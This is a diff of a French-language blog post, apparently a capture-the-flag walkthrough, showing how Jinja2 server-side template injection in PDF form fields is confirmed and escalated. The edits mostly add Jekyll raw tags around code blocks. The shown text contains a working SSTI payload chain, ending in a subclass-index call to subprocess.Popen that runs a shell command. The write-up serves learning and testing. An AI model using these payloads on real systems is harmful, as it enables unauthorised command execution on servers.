@@ -197,6 +197,7 @@ HackTricks a une excellente page sur le sujet : [Jinja2 SSTI - HackTricks](https
 
 J'ai commencé par le basique pour voir si c'était bien ça, en mettant les valeurs suivantes dans mon PDF :
 
+{% raw %}
 ```
 Name: {{ 8 * 3 }}
 Surname: {{ 8 * 4 }}
@@ -205,6 +206,7 @@ Birthday: {{ 8 * 6 }}
 Pet breed: {{ 8 * 7 }}
 Pet’s Name: {{ 8 * 8 }}
 ```
+{% endraw %}
 
 Bingo !
 
@@ -221,11 +223,13 @@ Bingo !
 
 Ensuite, dans les classes Python chargées en mémoire, il faut en trouver une intéressante. Je peux passer ce code :
 
+{% raw %}
 ```python
 {{ dict.__base__.__subclasses__() }}
 ```
+{% endraw %}
 
-En retour j'obtiens une liste énorme (dont voici le début) :
+En retour, j'obtiens une liste énorme (dont voici le début) :
 
 ```
 Name: [<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitemiterator'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>...
@@ -243,9 +247,11 @@ Je remarque la présence de `subprocess.Popen` dans la liste. Reste à savoir en
 
 Avec cet index, je peux désormais appeler la fonction :
 
+{% raw %}
 ```python
 {{ dict.__base__.__subclasses__()[351]('id',shell=True,stdout=-1).communicate()[0].strip() }}
 ```
+{% endraw %}
 
 Victoire !
 
